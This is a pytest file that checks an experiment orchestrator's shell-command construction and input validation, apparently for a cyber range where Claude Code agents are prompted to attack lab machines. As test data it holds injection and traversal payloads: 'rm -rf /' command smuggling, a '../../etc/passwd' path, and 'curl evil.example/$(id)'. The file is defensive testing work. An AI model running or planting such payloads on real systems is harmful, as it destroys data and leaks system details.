"""Behavior tests for the orchestrator's use of ScriptExecutionContext.

These pin the orchestrator-level contract: every command string constructed by
``execution_plan.build_execution_plan`` must come from a validated
``cyberscript.script_context.ScriptExecutionContext``. Bad inputs surface as
``ExecutionPlanError``, never as a raw ``ValidationError`` or as silently-bad
shell text. The tests drive real ``Experiment`` / ``ExperimentScript`` /
``ScriptAsset`` rows through real context construction and rendering — nothing
is mocked.
"""

from __future__ import annotations

import base64

import pytest
from django.contrib.auth import get_user_model

from cms.experiments.exceptions import ExecutionPlanError
from cms.experiments.models import Experiment, ExperimentRun, ExperimentScript, ScriptAsset
from cms.experiments.orchestrator import execution_plan
from cms.experiments.schemas import RunStatus

pytestmark = pytest.mark.django_db

User = get_user_model()


def _encoded(value: str) -> str:
    return base64.urlsafe_b64encode(value.encode()).decode()


@pytest.fixture
def user(db):
    return User.objects.create_user(username="exp-safety@example.com", email="exp-safety@example.com")


@pytest.fixture
def experiment(user):
    return Experiment.objects.create(user=user, name="Exp", scenario_id="basic")


@pytest.fixture
def run(experiment):
    return ExperimentRun.objects.create(experiment=experiment, run_number=1, status=RunStatus.PROVISIONING.value)


def _python_script(user, experiment, *, instance_name, s3_key, execution_order=10):
    asset = ScriptAsset.objects.create(
        user=user, name="s", s3_key=s3_key, original_filename="s.py", file_size_bytes=100
    )
    return ExperimentScript.objects.create(
        experiment=experiment,
        instance_name=instance_name,
        script_type="python",
        script=asset,
        execution_order=execution_order,
    )


def _claude_script(user, experiment, *, instance_name, claude_prompt, execution_order=10):
    return ExperimentScript.objects.create(
        experiment=experiment,
        instance_name=instance_name,
        script_type="claude_code",
        claude_prompt=claude_prompt,
        execution_order=execution_order,
    )


class TestPythonCommandSafety:
    """Python-script rendering must read every dynamic segment off the validated context."""

    def test_uses_instance_id_for_path_not_name(self, user, experiment, run):
        _python_script(user, experiment, instance_name="Workstation 1", s3_key="scripts/1/script.py")
        provisioned = {"Workstation 1": {"instance_id": "i-0abcdef12", "private_ip": "10.0.0.5"}}

        plan = execution_plan.build_execution_plan(experiment.pk, run, provisioned)

        assert len(plan.victim_commands) == 1
        cmd = plan.victim_commands[0].command
        assert "Workstation 1" not in cmd, "display name must not reach shell text"
        assert 'instance_id = "i-0abcdef12"' in cmd
        assert 'script_path = f"/tmp/script_{instance_id}.py"' in cmd
        assert 'output_path = f"/tmp/output_{instance_id}.log"' in cmd
        assert "scripts/1/script.py" not in cmd
        assert _encoded("scripts/1/script.py") in cmd

    def test_rejects_malformed_instance_id(self, user, experiment, run):
        _python_script(user, experiment, instance_name="Workstation", s3_key="scripts/1/script.py")
        provisioned = {"Workstation": {"instance_id": "i-evil; rm -rf /"}}

        with pytest.raises(ExecutionPlanError) as exc:
            execution_plan.build_execution_plan(experiment.pk, run, provisioned)
        assert "instance_id" in str(exc.value)

    def test_rejects_traversal_in_s3_key(self, user, experiment, run):
        _python_script(user, experiment, instance_name="Workstation", s3_key="scripts/../../etc/passwd")
        provisioned = {"Workstation": {"instance_id": "i-0abcdef12"}}

        with pytest.raises(ExecutionPlanError) as exc:
            execution_plan.build_execution_plan(experiment.pk, run, provisioned)
        assert "script_s3_key" in str(exc.value)

    def test_rejects_malformed_private_ip(self, user, experiment, run):
        """Bad private_ip must surface as ExecutionPlanError (the orchestrator reads
        the ``private_ip`` key, not ``ip``, so the IPv4 validator actually fires)."""
        _python_script(user, experiment, instance_name="Workstation", s3_key="scripts/1/script.py")
        provisioned = {"Workstation": {"instance_id": "i-0abcdef12", "private_ip": "999.0.0.1"}}

        with pytest.raises(ExecutionPlanError) as exc:
            execution_plan.build_execution_plan(experiment.pk, run, provisioned)
        assert "private_ip" in str(exc.value)

    def test_rejects_shell_metas_in_s3_key(self, user, experiment, run):
        _python_script(user, experiment, instance_name="Workstation", s3_key="scripts/1/x.py; curl evil.example/$(id)")
        provisioned = {"Workstation": {"instance_id": "i-0abcdef12"}}

        with pytest.raises(ExecutionPlanError):
            execution_plan.build_execution_plan(experiment.pk, run, provisioned)


class TestClaudeCommandSafety:
    """Claude-prompt rendering must resolve templates via the context, then encode."""

    def test_resolves_and_renders_prompt(self, user, experiment, run):
        _claude_script(
            user, experiment, instance_name="Workstation", claude_prompt="Attack the box at {{Workstation.ip}}"
        )
        provisioned = {"Workstation": {"instance_id": "i-0abcdef12", "private_ip": "10.0.0.5"}}

        plan = execution_plan.build_execution_plan(experiment.pk, run, provisioned)

        cmd = plan.victim_commands[0].command
        assert "Attack the box at 10.0.0.5" not in cmd
        assert _encoded("Attack the box at 10.0.0.5") in cmd
        assert '"-p",\n            prompt,' in cmd

    def test_validation_error_does_not_leak_raw_prompt(self, user, experiment, run):
        """Pydantic's default str() includes input_value; orchestrator must strip it."""
        sentinel = "THIS_RAW_PROMPT_MUST_NOT_LEAK_INTO_LOGS"
        _claude_script(user, experiment, instance_name="Workstation", claude_prompt=f"{sentinel} {{{{Ghost.ip}}}}")
        provisioned = {"Workstation": {"instance_id": "i-0abcdef12", "private_ip": "10.0.0.5"}}

        with pytest.raises(ExecutionPlanError) as exc:
            execution_plan.build_execution_plan(experiment.pk, run, provisioned)
        assert sentinel not in str(exc.value), "raw prompt body must not appear in the ExecutionPlanError message"

    def test_unknown_instance_in_template_surfaces_as_execution_plan_error(self, user, experiment, run):
        _claude_script(user, experiment, instance_name="Workstation", claude_prompt="hit {{Ghost.ip}}")
        provisioned = {"Workstation": {"instance_id": "i-0abcdef12", "private_ip": "10.0.0.5"}}

        with pytest.raises(ExecutionPlanError) as exc:
            execution_plan.build_execution_plan(experiment.pk, run, provisioned)
        assert "claude_prompt_template" in str(exc.value)

    def test_prompt_metacharacters_cross_shell_boundary_encoded(self, user, experiment, run):
        """`'; rm -rf /; echo '` in the prompt must not reach shell syntax."""
        _claude_script(user, experiment, instance_name="Workstation", claude_prompt="'; rm -rf /; echo '")
        provisioned = {"Workstation": {"instance_id": "i-0abcdef12"}}

        plan = execution_plan.build_execution_plan(experiment.pk, run, provisioned)

        cmd = plan.victim_commands[0].command
        assert "'; rm -rf /; echo '" not in cmd
        assert "; rm -rf" not in cmd
        assert _encoded("'; rm -rf /; echo '") in cmd
        assert '"-p",\n            prompt,' in cmd
